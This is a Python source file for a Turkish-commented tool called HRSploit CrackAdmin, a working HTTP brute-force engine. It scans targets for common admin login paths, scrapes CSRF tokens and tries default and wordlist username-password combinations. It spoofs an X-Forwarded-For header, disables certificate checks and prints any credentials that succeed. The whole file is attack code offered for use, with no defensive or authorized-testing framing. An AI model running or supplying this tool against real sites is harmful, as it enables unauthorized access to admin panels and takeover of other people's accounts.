#!/usr/bin/env python3
"""HRSploit — CrackAdmin Engine. Gerçek HTTP brute-force motoru."""
import sys, re, time, argparse, requests, threading, queue
from datetime import datetime

requests.packages.urllib3.disable_warnings()

DEFAULT_USERS = ["admin","administrator","root","user","test","manager",
                 "webmaster","operator","guest","superuser","sysadmin"]
DEFAULT_PASS  = ["admin","admin123","password","123456","test","root","toor",
                 "pass","1234","qwerty","letmein","welcome","abc123","P@ssw0rd",
                 "admin@123","changeme","12345678","admin1","password1","0000",
                 "111111","123123","1q2w3e4r","dragon","monkey","iloveyou",
                 "sunshine","princess","football","shadow","master","hello"]

ADMIN_PATHS = ["/admin","/admin/login","/administrator","/wp-admin","/wp-login.php",
               "/login","/panel","/cpanel","/dashboard","/admin.php","/user/login",
               "/auth/login","/backend","/manage","/secure","/portal","/console",
               "/phpmyadmin","/adminer.php","/signin","/account/login","/users/sign_in"]

def log(tag, msg):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"{ts} [{tag}] {msg}", flush=True)

def find_admin_panel(target: str, session: requests.Session) -> str:
    log("BRUTE", f"Admin panel aranıyor: {len(ADMIN_PATHS)} yol test ediliyor")
    for path in ADMIN_PATHS:
        try:
            url  = target.rstrip("/") + path
            r    = session.get(url, timeout=6, allow_redirects=True)
            body = r.text.lower()
            if r.status_code in (200,301,302) and any(
                    s in body for s in ["login","password","username","sign in","log in","admin"]):
                log("BRUTE", f"Admin panel bulundu: {url}  HTTP={r.status_code}")
                return url
        except Exception:
            pass
        time.sleep(0.05)
    log("BRUTE", "Admin panel bulunamadı — hedef URL kullanılacak")
    return target

def get_csrf_token(session, url):
    try:
        r   = session.get(url, timeout=8)
        m   = re.search(r'<input[^>]*name=["\']?(?:_token|csrf|csrftoken|authenticity_token)["\']?[^>]*value=["\']([^"\']+)["\']', r.text, re.I)
        tok = m.group(1) if m else None
        if tok: log("BRUTE", f"CSRF token alındı: {tok[:20]}...")
        return tok, r.cookies
    except Exception:
        return None, {}

def try_login(session, url, user, pwd, csrf=None):
    data = {
        "username": user, "password": pwd, "user": user,
        "pass": pwd, "email": user, "log": user, "pwd": pwd,
        "j_username": user, "j_password": pwd,
    }
    if csrf: data["_token"] = data["csrftoken"] = csrf
    headers = {"Referer": url, "Content-Type": "application/x-www-form-urlencoded"}
    try:
        r = session.post(url, data=data, timeout=10,
                         allow_redirects=True, headers=headers)
        body = r.text.lower()
        success = any(s in body for s in
                      ["dashboard","logout","welcome","signed in","logged in",
                       "admin panel","profile","my account","control panel"])
        fail    = any(s in body for s in
                      ["invalid","incorrect","wrong","error","failed",
                       "denied","unauthorized","invalid credentials"])
        if success and not fail:
            return True, r
        # URL değişimi
        if r.url != url and "login" not in r.url.lower():
            return True, r
        # Cookie kontrolü
        if any(c.name.lower() in ("session","auth","logged_in","user")
               for c in r.cookies):
            return True, r
    except Exception as e:
        return False, None
    return False, None

def brute(target: str, users: list = None, passwords: list = None,
          wordlist: str = None, threads: int = 5, delay: float = 0.1,
          batch: bool = False) -> list:
    log("BRUTE", f"Brute-force başlıyor: {target}")
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 Chrome/124 Safari/537.36",
        "X-Forwarded-For": "127.0.0.1",
    })
    session.verify = False

    login_url = find_admin_panel(target, session)
    csrf, cookies = get_csrf_token(session, login_url)
    if cookies:
        session.cookies.update(cookies)

    users_list = users or DEFAULT_USERS
    if wordlist:
        try:
            with open(wordlist, errors='ignore') as f:
                pass_list = [l.strip() for l in f if l.strip()][:1000]
            log("BRUTE", f"Wordlist yüklendi: {len(pass_list)} parola")
        except Exception:
            pass_list = passwords or DEFAULT_PASS
    else:
        pass_list = passwords or DEFAULT_PASS

    log("BRUTE", f"Kombinasyon: {len(users_list)} kullanıcı × {len(pass_list)} parola "
        f"= {len(users_list)*len(pass_list)}")

    found   = []
    total   = len(users_list) * len(pass_list)
    attempt = 0

    for user in users_list:
        for pwd in pass_list:
            attempt += 1
            ok, resp = try_login(session, login_url, user, pwd, csrf)
            if ok:
                log("BRUTE-HIT", f"🔴 GİRİŞ BAŞARILI! {user}:{pwd}  URL={login_url}")
                found.append({"user":user,"pass":pwd,"url":login_url})
                if batch: break
            if attempt % 20 == 0:
                log("BRUTE", f"Denendi: {attempt}/{total}  Mevcut: {user}:{pwd[:3]}***")
            time.sleep(delay)
        if found and batch: break

    log("BRUTE", f"Tamamlandı: {attempt} deneme | {len(found)} kimlik bulundu")
    return found

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="HRSploit CrackAdmin")
    p.add_argument("--url",      required=True)
    p.add_argument("--wordlist", default=None)
    p.add_argument("--username", default=None)
    p.add_argument("--threads",  type=int, default=5)
    p.add_argument("--delay",    type=float, default=0.1)
    p.add_argument("--batch",    action="store_true")
    args = p.parse_args()
    users = [args.username] if args.username else None
    results = brute(args.url, users=users, wordlist=args.wordlist,
                    threads=args.threads, delay=args.delay, batch=args.batch)
    for r in results:
        print(f"  FOUND: {r['user']}:{r['pass']}")
